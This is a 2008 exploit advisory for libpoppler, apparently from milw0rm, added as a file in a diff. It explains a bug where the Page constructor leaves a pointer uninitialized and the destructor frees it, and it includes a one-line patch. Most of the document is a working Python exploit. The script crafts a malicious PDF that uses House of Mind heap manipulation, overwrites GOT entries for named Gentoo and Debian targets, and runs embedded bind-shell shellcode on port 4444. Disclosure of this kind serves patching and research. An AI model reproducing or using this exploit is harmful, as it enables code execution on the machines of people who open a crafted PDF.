@@ -1,0 +1,550 @@
+##########################################################################
+####   Felipe Andres Manzano * fmanzano@fceia.unr.edu.ar              ####
+####   updates in http://felipe.andres.manzano.googlepages.com/home   ####
+##########################################################################
+'''
+
+
+Sumary:
+=======
+
+The libpoppler pdf rendering library, can free uninitialized pointers,
+leading to arbitrary code execution. This vulnerability results from
+memory management bugs in the Page class constructor/destructor.
+
+
+Technical Description - Exploit/Concept Code:
+=============================================
+
+Tests were performed using libpoppler util pdftotext taken from
+git://git.freedesktop.org/git/poppler/poppler.
+Other version where tried succesfully (the ones shiped with
+debian/gentoo).
+
+In the initialization of a Page object and under certain conditions a
+member object skips initialization, but then is eventualy deleted. This
+can be conducted to the situation in which an arbitrary pointer is
+passed to the libc free and so the it gets apropiate for the malloc
+maleficarum to enter the scene.
+
+Look at the Page class constructor on Page.cc:231. First at the begining
+of the function the member object  pageWidgets isnt initialized then it
+tries to check if the type of the annotations proposed on the pdf file
+ar correct; if not it bails out to the label err2. Note that is some
+incorcondance on the type of the anotation arise the member variable
+pageWidgets is never initialized! 
+
+Page::Page(XRef *xrefA, int numA, Dict *pageDict, PageAttrs *attrsA, Form *form) {
+  Object tmp;
+[...]
+ // annotations
+  pageDict->lookupNF("Annots", &annots);
+  if (!(annots.isRef() || annots.isArray() || annots.isNull())) {
+    error(-1, "Page annotations object (page %d) is wrong type (%s)",
+	  num, annots.getTypeName());
+    annots.free();
+    goto err2;
+  }
+
+  // forms
+  pageWidgets = new FormPageWidgets(xrefA, this->getAnnots(&tmp),num,form);
+  tmp.free();
+[...]
+ err2:
+  annots.initNull();
+ err1:
+  contents.initNull();
+  ok = gFalse;
+}
+
+But in the Page class destructor, Page.cc:309, pageWidgets is deleted
+without any consideration. The Page destructor is inmediatelly called
+after the erroneous Page construction.
+
+Page::~Page() {
+  delete pageWidgets;
+  delete attrs;
+  annots.free();
+  contents.free();
+}
+
+
+It is worth mentioning that the pdf rendering scenario is friendly with
+the heap massage technics because you will find lots of ways to allocate
+or allocate/free memory in the already probided functionality. In the
+POC I have used repetidely the 'name' of the fields of a pdf dictionary
+to allocate memory. Each name allocates up to 127bytes and apparently
+there is no limit in the number of fields. 
+
+
+The following excerpt is a sample verification of the existence of
+the problem :
+
+localhost expl-poppler # python poppler-exploit-rc8.py gentoo-pdftotext >test.pdf 
+localhost expl-poppler # pdftotext test.pdf 
+Error: PDF file is damaged - attempting to reconstruct xref table...
+Error: Annotation rectangle is wrong type
+Error: Bad bounding box for annotation
+Error: Bad bounding box for annotation
+Error: Bad bounding box for annotation
+Error: Bad bounding box for annotation
+Error: Bad bounding box for annotation
+Error: Page annotations object (page 3) is wrong type (integer)
+Error: Page count in top-level pages object is incorrect
+Error: Couldnt read page catalog
+Trace/breakpoint trap
+
+:)
+
+
+Further research should be done to accomodate the heap for other applications like evince:
+localhost expl-poppler # evince test.pdf 
+
+(evince:8912): GnomeUI-WARNING **: While connecting to session manager:
+Authentication Rejected, reason : None of the authentication protocols specified are supported and host-based authentication failed.
+
+** (evince:8912): WARNING **: Service registration failed.
+
+** (evince:8912): WARNING **: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
+Error: PDF file is damaged - attempting to reconstruct xref table...
+Error: Annotation rectangle is wrong type
+Error: Bad bounding box for annotation
+Error: Bad bounding box for annotation
+Error: Bad bounding box for annotation
+Error: Bad bounding box for annotation
+Error: Bad bounding box for annotation
+Error: Page annotations object (page 3) is wrong type (integer)
+*** glibc detected *** evince: munmap_chunk(): invalid pointer: 0x08100468 ***
+
+Note that 0x08100468 is still a provided pointer. But in this try some
+malloc structure like _heap_info (see. house of mind) is not correctly
+aligned any more. Maybe evince-thumbnailer which is (probably
+monothreaded) is an easier target.
+
+
+Patch
+=====
+
+diff --git a/poppler/Page.cc b/poppler/Page.cc
+index b28a3ee..72a706b 100644
+--- a/poppler/Page.cc
++++ b/poppler/Page.cc
+@@ -230,7 +230,7 @@ GBool PageAttrs::readBox(Dict *dict, char *key, PDFRectangle *box) {
+ 
+ Page::Page(XRef *xrefA, int numA, Dict *pageDict, PageAttrs *attrsA, Form *form) {
+   Object tmp;
+-	
++  pageWidgets =	NULL;  //Security fix
+   ok = gTrue;
+   xref = xrefA;
+   num = numA;
+
+
+POC:
+===
+
+Written in pyploit. It can be used 2 ways , one selecting a preconfigured
+target like *gentoo-pdftotext* or the other in which you could pass some
+malloc/free execution trace moddifing parameters. 
+
+'''
+
+import struct
+import struct
+import math
+import os
+
+import sys
+
+## print "%.400f"%d wont work :( ... so a quick double printing class 
+class Doubles:
+    def __init__(self, precision=400):
+        self.precision=precision
+
+    def pdficateint(self,i1,i2):
+        s = struct.pack("@L",i1) + struct.pack("@L",i2)
+        return self.pdficatestr(s)
+
+    def pdficate(self,s):
+        rslt = " "
+        for  pos in range (0,len(s)/8):
+            rslt+=self.pdficatestr(s[(pos*8):(pos*8)+8])+" " 
+        return rslt;
+
+    def pdficatestr(self, s):
+        d = struct.unpack("d",s)[0]
+        rslt=" "
+        if(d<0.0):
+            rslt+="-"
+            d=-d
+        rslt+="%d."%int(math.floor(d))
+        myd=math.floor(d)
+        scale=0.1
+	nines=0
+        for p in range(1,self.precision):
+            for i in range(1,10):
+	        if (myd+scale*i) > d:
+	            i-=1
+	            break
+            if i==9:
+		if nines>6:
+		    return rslt
+		else:
+		    nines+=1
+	    else:
+		nines=0
+            rslt+=("%02d"%i)[1]
+            myd+=scale* i
+            scale=scale*0.1
+	return rslt
+
+##From Malloc maleficarum
+##http://packetstormsecurity.org/papers/attack/MallocMaleficarum.txt
+class HouseOfMind:
+
+    HEAP_MAX_SIZE=(1024*1024) 
+    JMP='\xeb'
+    NOP='\x90'
+    PAD='\x00'
+    PREV_INUSE=0x1
+    IS_MMAPPED=0x2
+    NON_MAIN_ARENA=0x4
+    def __init__(self, base, where, payload, entrypoint):
+        self.base=base
+        self.where=where-0xc
+        self.heap_info = (base+self.HEAP_MAX_SIZE-1)& ~(self.HEAP_MAX_SIZE-1)
+        self.payload=payload
+        self.entrypoint=entrypoint
+        self.chunkaddress=0
+        if (self.entrypoint > 0xff - 8):
+        	throw 
+        
+## lendian, 32bit only
+## See The Malloc Maleficarum / House of Mind
+    def mind(self):
+        rslt = ""
+        #first we add padding to reach the next Heap border
+        rslt+=self.PAD*(self.heap_info-self.base)
+
+        #now we add a _heap_info pinting to a malloc_state of our own
+        #and dictating a generous size for this *heap*	
+        ##arena.c:59 //struct _heap_info
+        rslt += struct.pack("<L", self.heap_info + 16) # Arena for this heap.
+        rslt += struct.pack("<L", 0x0000000) # Previous heap. (BUG: Don't know what M does with this)
+        rslt += struct.pack("<L", 0x7000000) # Current size in bytes.
+        rslt += struct.pack("<L", 0x7000000) # Size in bytes that has been mprotected PROT_READ|PROT_WRITE
+        #here arena.c suggest some padding. We just don't do it.
+
+
+        #now we add the malloc_state of our own
+        ##malloc.c:2317 //struct malloc_state
+        rslt += struct.pack("<L", 0x00000000)	# mutex for serializing access * 0 -> unlocked.
+        rslt += struct.pack("<L", 0x000ffff)	# Flags * We need NONCONTIGUOUS_BIT to be on for passing
+        					# condition on malloc.c:@@@@@
+
+        #Note: We assume not Thread's stats#
+        
+        rslt += struct.pack("<L", 0x00000000)*10 	#Fastbins * We don use them.
+        rslt += struct.pack("<L", 0x00000000)		#Base of the topmost chunk--not otherwise kept in a bin
+        						#We need it to be different to our chunk pointer for 
+        						#passing condition on malloc.c:@@@@, 0 is safe enough
+        rslt += struct.pack("<L", 0x00000000)	#The remainder from the most recent split of a small request
+
+        #Here it come the bins
+        ##The first one is the Unsorted bin! 
+        ##Free will write the *chunk* to the containing address +0xc; so it
+        ##shout point to the GOT pointer to 'overload' -0xc
+        rslt += struct.pack("<L", self.where);
+ 
+        rslt += struct.pack("<L", 0x0000000)* 253	#All the other unused bins go to 0 * ~
+        rslt += struct.pack("<L", 0x00000000)*4		#Bitmap of bins
+
+        rslt += struct.pack("<L", 0x00000000)	#Linked list next malloc_state
+        
+        ##Memory allocated from the system in this arena.
+        rslt += struct.pack("<L", 0x70000000)	#system_mem * Need to be big enough for passing the
+        					#condition on malloc:@@@@
+        rslt += struct.pack("<L", 0x00000000)	#max_system_mem ?? 
+
+        #needed for chunk aligment
+        rslt += self.PAD*4
+
+#CHUNKS
+#             An allocated chunk looks like this:
+#
+#    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+#            |             Size of previous chunk, if allocated            | |
+#            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+#            |             Size of chunk, in bytes                       |M|P|
+#      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+#            |             User data starts here...                          .
+#            .                                                               .
+#            .             (malloc_usable_size() bytes)                      .
+#            .                                                               |
+#nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+#            |             Size of chunk                                     |
+#            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+        #chunk 0 There isn't a single reason for this to exist * wabaaaaaaaaaa!
+#        rslt += struct.pack("<L", 16)	#Size of previous chunk * UNUSED
+#        rslt += struct.pack("<L", 64) 	#Size of chunk, in bytes. No flags
+#        rslt += self.PAD*(64-8)
+
+        #chunk 1 THE CHAMP
+        rslt += "\x40"+self.JMP+struct.pack("B",5+self.entrypoint)+self.PAD    #Size of previous chunk *DOESN'T MATTER!
+        rslt += struct.pack("<L",8+len(self.payload)|self.PREV_INUSE|self.NON_MAIN_ARENA) # Size of this chunk
+        								      #TODO: Explain flags, link code
+        
+        ##Save the chunk1 address 
+        self.chunkaddress= self.base + len(rslt)
+        rslt += self.payload	#payload (payload[entrypoint] should contain shellcode)!
+
+        #chunk 2 THE LAST?
+        rslt += struct.pack("<L",8+len(self.payload))	#Size of previous chunk
+        						#TODO: link where it is checked
+ 
+        rslt += struct.pack("<L",64|self.PREV_INUSE|self.NON_MAIN_ARENA)  #Size of this chunk 
+        								  #Neds to be greater than 2 * SIZE_SZ,
+        								  #TODO: Explain flags, link code
+
+        rslt += self.PAD*(64-8)
+
+        #chunk 3 THE LAST!
+        rslt += struct.pack("<L",64)		#Size of previous chunk
+        rslt += struct.pack("<L",self.PREV_INUSE)    #Size of this chunk * Here we need just the PREV_INUSE bit set
+        return rslt
+        #no need no payload
+
+#For constructing a minimal pdf file
+class PDFObject:
+    def __init__(self,toks):
+        self.toks=toks
+        self.n=0
+        self.v=0
+           
+    def __str__(self):
+        s="%d %d obj\n"%(self.n,self.v)
+        for t in self.toks:
+            s+=t.__str__()
+        s+="\nendobj\n" 
+        return s
+
+
+class PDFDict():
+    def __init__(self):
+        self.dict = []	
+
+    def add(self,name,obj):
+        self.dict.append((name,obj))
+
+    def __str__(self):
+        s="<<"
+        for name,obj in self.dict:
+            s+="/%s %s\n"%(name,obj)
+        s+=">>"
+        return s	
+
+class PDFName():
+    def __init__(self,s):
+        self.s=s
+    def __str__(self):
+        return "/%s"%self.s
+
+class PDFString():
+    def __init__(self,s):
+        self.s=s
+    def __str__(self):
+        return "(%s)"%self.s
+
+class PDFRef():
+    def __init__(self,obj):
+        self.obj=obj
+    def __str__(self):
+        return "%d %d R"%(self.obj.n,self.obj.v)
+
+
+class PDFDoc():
+    def __init__(self):
+        self.objs=[]
+        	
+    def add(self,obj):
+        obj.v=0
+        obj.n=1+len(self.objs)
+        self.objs.append(obj)
+
+    def _header(self):
+        return "%PDF-1.5\n"
+    
+    def __str__(self):
+        doc1 = "%PDF-1.5\n"
+        xref = {}
+        for obj in self.objs:
+            xref[obj.n] = len(doc1)
+            doc1=doc1+obj.__str__()
+        posxref=len(doc1)
+        doc1+="xref\n"
+        doc1+="0 %d\n"%len(self.objs)
+        doc1+="0000000000 65535 f\n"
+        for xr in xref.keys():
+            doc1+= "%010d %05d n\n"%(xref[xr],0)
+        doc1+="trailer\n"
+        trailer =  PDFDict()
+        trailer.add("Size",len(self.objs))
+        trailer.add("Root","2 0 R")
+        doc1+=trailer.__str__()
+        doc1+="\nstartxref\n%d\n"%posxref	
+        doc1+="%%EOF\n\n"    	
+
+        return doc1
+
+#The ... "POC"
+class PopplerExpl:
+
+    def __init__(self,shellcode):
+	self.shellcode=shellcode
+        self.d = Doubles()
+
+#this wraps the shellcode in an encoding supported by 'doubles'
+    def wrap(self,scode,where):
+	wrapscode = '\xb8' + struct.pack("<L",where)+"\x90"*3  	#movl where, %eax;nop;nop;nop
+	for c in scode:
+	    wrapscode += "\xc6\x00%c\x40"%c 			#movb $c, (%eax); inc %eax
+ 	if (len(scode)%2!=0):
+	    wrapscode += "\xc6\x00\xcc\x40"		 	#movb $0xcc, (%eax); inc %eax
+	wrapscode += "\xb8" + struct.pack("<L",where)+"\x90"*3	#movl where, %eax;nop;nop;nop
+	wrapscode += "\x50\xc3"					#push %eax;ret
+	return wrapscode + '\x00'*(1000-len(wrapscode))		#padding to a supported size
+
+    def make(self,base,got,massage=None):
+        #here we generate the house of mind thingy
+	#The House Of Mind  instance.
+	#Te first word es passed tu a gfree so we put 0 so we ignore that free.
+        hm = HouseOfMind(base, got, "\x00"*16+ self.wrap(self.shellcode,base), 16)
+        mind = hm.mind()
+
+        doc = PDFDoc()
+        doc.add(PDFObject(["<</Length 3>>\nstream...\nendstream\n"]))
+        catalog = PDFDict()
+        catalog.add("Type", PDFName("Catalog"))
+        catalog.add("Outlines", "3 0 R")
+        catalog.add("Pages", "4 0 R")
+        catalog.add("AcroForm", "<</Fields [ 7 0 R ]>>")
+
+        #for i in range(0,1000):
+        #    catalog.add( "C"*82 + "%05d"%i,  0)
+
+        outlines = PDFDict()
+        outlines.add("Type", PDFName("Outlines"))
+        outlines.add("Count",0)
+
+        pages = PDFDict()
+        pages.add("Type", PDFName("Pages"))
+        pages.add("Kids","[ 8 0 R  6 0 R 5 0 R ]")
+        pages.add("Count","3")
+
+        doc.add(PDFObject([catalog]))
+        doc.add(PDFObject([outlines]))
+        doc.add(PDFObject([pages]))
+
+        page1 = PDFDict()
+        page1.add("Type", PDFName("Page"))
+        page1.add("Parent", "4 0 R")
+        page1.add("MediaBox","[ 0 0 612 792 ]")
+        page1.add("Contents", "1 0 R")
+        page1.add("Resources", "<< /ProcSet 6 0 R >>")
+        page1.add("Annots", "0")
+        
+	#malloc-fill-free lots of chunks of the size then used by Page class(88)         
+        for pagesize in range(88,126):
+	    payload = ("".join(["#%02x"%ord(struct.pack("@L",hm.chunkaddress)[i]) for i in range (0,4)]))*19
+	    payload += "B"*(pagesize-(len(payload)/3)) 
+	    for i in range(0,10):
+        	page1.add(payload, 0)
+
+        doc.add(PDFObject([page1]))
+
+        page1 = PDFDict()
+        page1.add("Type", PDFName("Page"))
+        page1.add("Parent", "4 0 R")
+        page1.add("MediaBox","[ 0 0 612 792 ]")
+        page1.add("Contents", "1 0 R")
+        page1.add("Resources", "<< /ProcSet 6 0 R >>")
+        page1.add("Annots", "[7 0 R 7 0 R 7 0 R 7 0 R]")
+
+        #massage session 1
+        size=127
+        for i in range(0,massage[0]):
+            page1.add( "A"*(size-5)+("%05d"%(i)),  "B"*size)
+
+        doc.add(PDFObject([page1]))
+        annots = PDFDict()
+        annots.add("Subtype","/Text")
+
+        annots.add("BS", "<</D [ "+
+	"0 "*massage[1] + 
+        self.d.pdficate(mind)+
+        #more massage>?
+        "0.0 "*massage[2] + " ]>>")
+
+        annots.add("FT", "/Tx")
+        doc.add(PDFObject([annots]))
+
+        page1 = PDFDict()
+        page1.add("Type", PDFName("Page"))
+        page1.add("Parent", "4 0 R")
+        page1.add("MediaBox","[ 0 0 612 792 ]")
+        page1.add("Contents", "1 0 R")
+        page1.add("Resources", "<< /ProcSet 6 0 R >>")
+        page1.add("Annots", "[7 0 R]")
+        doc.add(PDFObject([page1]))
+        doc.add(PDFObject(["<<>>"]))
+        doc.add(PDFObject(["[ /PDF ]"]))
+        return doc.__str__()
+
+
+##Main
+## Not every shellcode will work by now
+## Only the ones that taken by 8bytes form an ieee754 double presicion float
+## with an exponent not too positive ... :)
+
+## linux_ia32_bind -  LPORT=4444 Size=84 Encoder=None http://metasploit.com 
+scode = "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
+scode += "\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
+scode += "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
+scode += "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
+scode += "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
+scode += "\x89\xe1\xcd\x80"
+
+#expl = PopplerExpl( ('\xcc'+'\x90')*((160-16)/2))
+expl = PopplerExpl(scode)
+
+targets = {
+    "gentoo-pdftotext":(0x08100000, 0x804c014, 1863, 20, 400),
+    "debian4-pdftotext":(0x08100000, 0x804bb18, 1879, 33, 400),
+    "gentoo-evince-thumbnailer": (0x8100000, 0x080712c4, 907, 34, 200),
+
+}
+
+if len( sys.argv )==1:
+    print "Comments -> fmanzano@fceia.unr.edu.ar"
+    print "Usage 1:"
+    print "	%s "%sys.argv[0], targets.keys()
+    print "Usage 2:"
+    print "	%s   massage1 massage2 massage3  base got"%sys.argv[0]
+    print "	The idea here is to align the _heap_info struct that commences with 0x08?00010 "
+    print "	to the address 0x8?0000. For this pourpose move massage1/2/3. "
+    print "	THIS STUPIDLY SIMPLE METHOD WOULD WORK FOR VERY FEW APPS !"
+    print "	base is the 1024*1024 bytes aligned address to which we are trying to align everything" 
+    print "	got is the addres of the got where the thing is going to write the shellcode address"
+    print "	BTW by now the shellcode is nop;int 3;nop...grooovy!.. NOT"
+elif len( sys.argv )>2:
+    print expl.make(int(sys.argv[4][2:],16), int(sys.argv[5][2:],16), (int(sys.argv[1]),int(sys.argv[2]),int(sys.argv[3])))
+else:
+    #base: the expected heap limit (08100000,08200000,....08f00000... )
+    #got: address of the got entry to change 
+    #chinesse massage
+    base,got,massage1,massage2,massage3 = targets[sys.argv[1]]
+    print expl.make(base,got,(massage1,massage2,massage3))
+
+# milw0rm.com [2008-07-08]
